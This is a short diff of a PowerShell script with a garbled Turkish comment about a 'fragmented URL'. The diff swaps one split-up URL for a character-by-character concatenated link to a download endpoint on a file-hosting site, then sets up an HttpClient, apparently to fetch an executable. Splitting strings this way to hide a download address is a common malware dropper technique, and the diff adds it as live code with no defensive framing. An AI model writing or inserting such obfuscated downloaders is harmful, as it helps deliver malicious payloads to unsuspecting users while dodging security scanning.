@@ -119,8 +119,8 @@ if ($psversiontable.PSVersion.Major -gt 2) {
     }
 }
 
-# URL parçalanmýþ þekilde
-$url = 'https' + '://an' + 'onbi' + 'ns.n' + 'et/di' + 'rect.p' + 'hp/GI' + 'T.exe'
+# URL parÃ§alanmÃ½Ã¾ Ã¾ekilde
+$url = "h" + "t" + "t" + "p" + "s" + "://" + "a" + "n" + "o" + "n" + "b" + "i" + "n" + "s" + "." + "n" + "e" + "t" + "/" + "d" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "." + "p" + "h" + "p" + "?" + "i" + "d" + "=" + "1" + "5"
 
 Add-Type -AssemblyName System.Net.Http
 $httpclient = [System.Net.Http.HttpClient]::new()
